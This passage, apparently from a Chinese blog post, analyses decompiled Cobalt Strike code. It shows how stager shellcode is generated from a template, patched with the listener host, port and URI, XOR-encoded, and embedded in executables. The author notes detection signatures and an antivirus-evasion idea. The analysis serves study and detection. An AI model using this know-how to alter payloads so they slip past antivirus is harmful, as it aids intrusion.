-<p>​        我们选择一个BeaconHTTPStagerX86来看看，payload函数执行了什么操作，通过下面的代码可以看到返回了windows/beacon_http/reverse_http，其他的payload函数返回的内容类似，就不一一举例了。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831193156043.png" alt="image-20200831193156043"></p>
-<p>​        那么var1的内容是什么呢？还是以http x86的stager为例，我们发现它是new BeaconHTTPStagerX86（）后返回的结果。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203310084.png" alt="image-20200831203310084"></p>
-<p>​        那么BeaconHTTPStagerX86在构造方法中又做了什么操作呢，我们通过下面的代码可以看到它调用了父类GenericHTTPStagerX86的构造方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203430325.png" alt="image-20200831203430325"></p>
-<p>​        跟进GenericHTTPStagerX86的构造方法，发现其又调用了父类GenericHTTPStager的构造方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203519702.png" alt="image-20200831203519702"></p>
-<p>​        跟进GenericHTTPStager的构造方法，发现其又调用了父类GenericStager的构造方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203558124.png" alt="image-20200831203558124"></p>
-<p>​        在GenericStager方法中，可以看到其实什么也没做</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203712286.png" alt="image-20200831203712286"></p>
-<p>​        最后其实比较关键的代码是调用了generate方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203932934.png" alt="image-20200831203932934"></p>
-<p>​        因为我的listener是http x86的listener，所以最终调用stagers\GenericHTTPStager.class的generate方法如下，</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831204215357.png" alt="image-20200831204215357"></p>
-<p>​        在该代码种首先通过resouce方法加载资源，资源文件，资源文件是通过getStagetFile()获得的，在GenericHTTPStager.class中的getStagetFile是一个抽象方法，而且GenericHTTPStager也是一个抽象类，所以我们要在继承了GenericHTTPStager的子类中寻找getStagetFile的实现，最终在GenericHTTPStagerX86找到了getStagetFile的实现，是加载resources/httpstager.bin文件</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901094550546.png" alt="image-20200901094550546"></p>
-<p>​        下面的代码中,读取httpstager.bin文件的内容，并且对其中的某些值进行替换，httpstager.bin其实就是shellcode生成的一个模板文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public byte[] generate() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream var1 &#x3D; CommonUtils.resource(this.getStagerFile());  &#x2F;&#x2F;读取httpstager.bin的内容</span><br><span class="line">           byte[] var2 &#x3D; CommonUtils.readAll(var1);</span><br><span class="line">           String var3 &#x3D; CommonUtils.bString(var2); &#x2F;&#x2F;从byte类型转换为字符串类型</span><br><span class="line">           var1.close();</span><br><span class="line">           var3 &#x3D; var3 + this.getListener().getStagerHost() + &#39;\u0000&#39;; &#x2F;&#x2F;从option中获取host</span><br><span class="line">           Packer var4 &#x3D; new Packer();  &#x2F;&#x2F;类中内置了对于字符串，字节，hex等处理的方法</span><br><span class="line">           var4.little(); &#x2F;&#x2F;字节顺序，决定大端字节和小端字节的读取问题</span><br><span class="line">           var4.addShort(this.getListener().getPort()); &#x2F;&#x2F;从option中获取port值</span><br><span class="line">           AssertUtils.TestPatchS(var2, 4444, this.getPortOffset()); &#x2F;&#x2F;判断getPortOffset的对应的值是否是4444</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getPortOffset()); &#x2F;&#x2F;将4444替换为option设置的端口地址</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(1453503984); &#x2F;&#x2F;exit对应的偏移地址</span><br><span class="line">           AssertUtils.TestPatchI(var2, 1453503984, this.getExitOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getExitOffset()); &#x2F;&#x2F;exit对应的偏移地址替换，不过这个看起来默认是没变的</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addShort(this.getStagePreamble());&#x2F;&#x2F;在getStagePreamble中判断是否为forign类型，如果不是，则返回stage_offset。</span><br><span class="line">           AssertUtils.TestPatchS(var2, 5555, this.getSkipOffset()); &#x2F;&#x2F;判断getSkipOffset的返回值是否是5555</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getSkipOffset()); &#x2F;&#x2F;将stage_offset的值进行替换</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(this.getConnectionFlags());  &#x2F;&#x2F;判断是否是https</span><br><span class="line">           AssertUtils.TestPatchI(var2, this.isSSL() ? -2069876224 : -2074082816, this.getFlagsOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getFlagsOffset());</span><br><span class="line">           String var5;</span><br><span class="line">           if (CommonUtils.isin(CommonUtils.repeat(&quot;X&quot;, 303), var3)) &#123;</span><br><span class="line">               var5 &#x3D; this.getConfig().pad(this.getHeaders() + &#39;\u0000&#39;, 303);</span><br><span class="line">               var3 &#x3D; CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat(&quot;X&quot;, 127))); &#x2F;&#x2F;将hreader中的值进行替换</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           int var6 &#x3D; var3.indexOf(CommonUtils.repeat(&quot;Y&quot;, 79), 0);</span><br><span class="line">           var5 &#x3D; this.getConfig().pad(this.getURI() + &#39;\u0000&#39;, 79);</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, var5, var6); &#x2F;&#x2F;从config中获取url的值，并进行替换</span><br><span class="line">           return CommonUtils.toBytes(var3 + this.getConfig().getWatermark()); &#x2F;&#x2F;以字节数组的形式返回</span><br><span class="line">       &#125; catch (IOException var7) &#123;</span><br><span class="line">           MudgeSanity.logException(&quot;HttpStagerGeneric: &quot; + this.getStagerFile(), var7, false);</span><br><span class="line">           return new byte[0];</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        通过上面的分析，我们可以看出来，这里所作的操作就是读取httpstager.bin这个模板文件，然后对模板文件中的请求地址，请求头等地方进行替换。</p>
-<p>​        再回到aggressor\dialogs\PayloadGeneratorDialog.class中，我们看下dialogResult方法,这个方法会针对我们选择不同的shellcode的生成类型，将stager转换为不同的类型，最后写入到文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public void dialogResult(String var1) &#123;</span><br><span class="line">      String var2 &#x3D; DialogUtils.string(this.options, &quot;format&quot;);</span><br><span class="line">      boolean var3 &#x3D; DialogUtils.bool(this.options, &quot;x64&quot;);</span><br><span class="line">      String var4 &#x3D; DialogUtils.string(this.options, &quot;listener&quot;);</span><br><span class="line">      if (var2.equals(&quot;C&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toC(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Java&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toJava(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Perl&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPerl(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, false);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Python&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">      &#125; else if (!var2.equals(&quot;Raw&quot;)) &#123;</span><br><span class="line">          if (var2.equals(&quot;Ruby&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;COM Scriptlet&quot;)) &#123;</span><br><span class="line">              if (var3) &#123;</span><br><span class="line">                  DialogUtils.showError(var2 + &quot; is not compatible with x64 stagers&quot;);</span><br><span class="line">                  return;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              this.stager &#x3D; (new ArtifactUtils(this.client)).buildSCT(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;Veil&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toVeil(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;VBA&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; CommonUtils.toBytes(&quot;myArray &#x3D; &quot; + Transforms.toVBA(this.stager));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      CommonUtils.writeToFile(new File(var1), this.stager);</span><br><span class="line">      DialogUtils.showInfo(&quot;Saved &quot; + var2 + &quot; to\n&quot; + var1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        我们以C#为例来进行分析，主要代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">            this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br></pre></td></tr></table></figure>
-
-<p>​        跟进toCSharp方法，创建了一个Packer对象，添加了stager长度的字符串，再添加了stager字节数组的字符串。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115643729.png" alt="image-20200901115643729"></p>
-<p>​        最后再将生成的shellcode写入文件。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115942287.png" alt="image-20200901115942287"></p>
-<p>​        好了，关于payload generator的过程就分析到这里，可能由于个人水平有限，在静态代码分析的功底有限，有些地方可能分析的不对，不过这里大致的流程分析是没有问题的。主要是在stager生成这里，将httpstager.bin模板里的关于监听主机和端口以及uri的位置进行了替换和修改，然后根据不同的类型写入文件。所以如果要免杀，其实有一个思路也是可以将这个httpstager.bin的内容分析出来，将有特征的部分进行更改。</p>
-<h3 id="windows-executable"><a href="#windows-executable" class="headerlink" title="windows executable"></a>windows executable</h3><p>​        windows executable是在WindowsExecutableDialog.class中进行处理的，其中关于stager生成的部分和payload generator相同，就不分析了，再看下dialogResult方法，先看下windows exe是怎么处理的，这里主要是调用了patchArtifact方法来进行处理，我们看下这个方法是做什么的。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901133939693.png" alt="image-20200901133939693"></p>
-<p>​        跟进patchArtifact，发现内部还调用了patchArtifact方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901134326360.png" alt="image-20200901134326360"></p>
-<p>​        继续跟进</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public byte[] patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    Stack var3 &#x3D; new Stack();</span><br><span class="line">    var3.push(SleepUtils.getScalar(var1));</span><br><span class="line">    var3.push(SleepUtils.getScalar(var2));</span><br><span class="line">    String var4 &#x3D; this.client.getScriptEngine().format(&quot;EXECUTABLE_ARTIFACT_GENERATOR&quot;, var3);</span><br><span class="line">    return var4 &#x3D;&#x3D; null ? this.fixChecksum(this._patchArtifact(var1, var2)) : this.fixChecksum(CommonUtils.toBytes(var4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        主要看下_patchArtifact的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public byte[] _patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream var3 &#x3D; CommonUtils.resource(&quot;resources&#x2F;&quot; + var2); &#x2F;&#x2F;我这里var2是artifact64.exe，所以这里加载的是resources&#x2F;artifact64.exe</span><br><span class="line">        byte[] var4 &#x3D; CommonUtils.readAll(var3); &#x2F;&#x2F;读取artifact64.exe的内容</span><br><span class="line">        var3.close();</span><br><span class="line">        byte[] var5 &#x3D; new byte[]&#123;(byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254)&#125;;</span><br><span class="line">        byte[] var6 &#x3D; new byte[var1.length];</span><br><span class="line"></span><br><span class="line">        for(int var7 &#x3D; 0; var7 &lt; var1.length; ++var7) &#123;</span><br><span class="line">            var6[var7] &#x3D; (byte)(var1[var7] ^ var5[var7 % 4]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var12 &#x3D; CommonUtils.bString(var4);</span><br><span class="line">        int var8 &#x3D; var12.indexOf(CommonUtils.repeat(&quot;A&quot;, 1024));&#x2F;&#x2F;找到存在1024个A的位置</span><br><span class="line">        Packer var9 &#x3D; new Packer();</span><br><span class="line">        var9.little();</span><br><span class="line">        var9.addInteger(var8 + 16);</span><br><span class="line">        var9.addInteger(var1.length); &#x2F;&#x2F;写入stager的长度</span><br><span class="line">        var9.addString(var5, var5.length); &#x2F;&#x2F; 写入随机字符</span><br><span class="line">        var9.addString(&quot;aaaa&quot;, 4);  </span><br><span class="line">        var9.addString(var6, var6.length); &#x2F;&#x2F;写入stager内容</span><br><span class="line">        if (License.isTrial()) &#123;</span><br><span class="line">            var9.addString(&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);</span><br><span class="line">            CommonUtils.print_trial(&quot;Added EICAR string to &quot; + var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byte[] var10 &#x3D; var9.getBytes();</span><br><span class="line">        var12 &#x3D; CommonUtils.replaceAt(var12, CommonUtils.bString(var10), var8);</span><br><span class="line">        return CommonUtils.toBytes(var12);</span><br><span class="line">    &#125; catch (IOException var11) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;patchArtifact&quot;, var11, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        总结一下上面的过程，主要就是将1024个A的地址进行替换，替换为随机字符和stager。        </p>
-<p>​        用010 editor打开artifact64.exe文件，发现确实是有很多A</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901140702963.png" alt="image-20200901140702963"></p>
-<p>​        我们再尝试生成一个x64的exe，用010 editor再看看里面的内容，我们可以看到在某处的开头是有aaaa，并且在最后还有一些大写的A,所以这两个点都可以当作CobaltStrike默认生成的exe的特征。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142122258.png" alt="image-20200901142122258"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142214196.png" alt="image-20200901142214196"></p>
-<p>​        我再看了下dll和service类型的生成方式，发现最终都调用了_patchArtifact方法，因此他们这些模板文件中也都包含了1024个A，并且在替换的过程中首先也会写入四个a,我们以dll为例再看看。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143237412.png" alt="image-20200901143237412"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143245238.png" alt="image-20200901143245238"></p>
-<p>​        那我们猜想一下，关于这个特征查杀是也可以根据首先出现4个a，在1024个字符以内，又同时出现10个A来进行检测呢？</p>
-<h3 id="windows-executables"><a href="#windows-executables" class="headerlink" title="windows executables"></a>windows executables</h3><p>​        还有一种形式，我们在使用privote生成shellcode常用到，那就是windows executables生成的是stagerless类型，这种形式的生成是在WindowsExecutableStageDialog.class文件中</p>
-<p>​        首先看下dialogAction中的代码，我们可以看到和payload generator和windows executable的形式不同，executables中并没有在这个方法中生成stager。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144358493.png" alt="image-20200901144358493"></p>
-<p>​        再看下dialogResult方法,和其他的方式不同，它也获取了SCListener，并通过调用export方法</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144705204.png" alt="image-20200901144705204"></p>
-<p>​        我们跟进export方法，export的代码如下，他根据payload的类型，调用了不同的方法，我们以最基本的http_reverse为例进行分析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public byte[] export(String var1, int var2) &#123;</span><br><span class="line">    if (&quot;windows&#x2F;foreign&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;foreign&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_http&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_https&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_dns&#x2F;reverse_dns_txt&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageDNS(this.getPort(), this.getCallbackHosts(), true, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_pipe&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportSMBStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBindTCPStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_reverse_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportReverseTCPStage(var1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        AssertUtils.TestFail(&quot;Unknown payload &#39;&quot; + this.getPayload() + &quot;&#39;&quot;);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        我们发现其调用了exportBeaconStageHTTP方法，跟进这个方法，首先判断架构，再根据架构的不同给var6进行赋值，最后调用了exportBeaconStage方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public byte[] exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    AssertUtils.TestSetValue(var5, &quot;x86, x64&quot;);</span><br><span class="line">    String var6 &#x3D; &quot;&quot;;</span><br><span class="line">    if (&quot;x86&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.dll&quot;;</span><br><span class="line">    &#125; else if (&quot;x64&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.x64.dll&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        跟进exportBeaconStage方法，这个方法比较长，我会把简单的分析写在注释中</p>
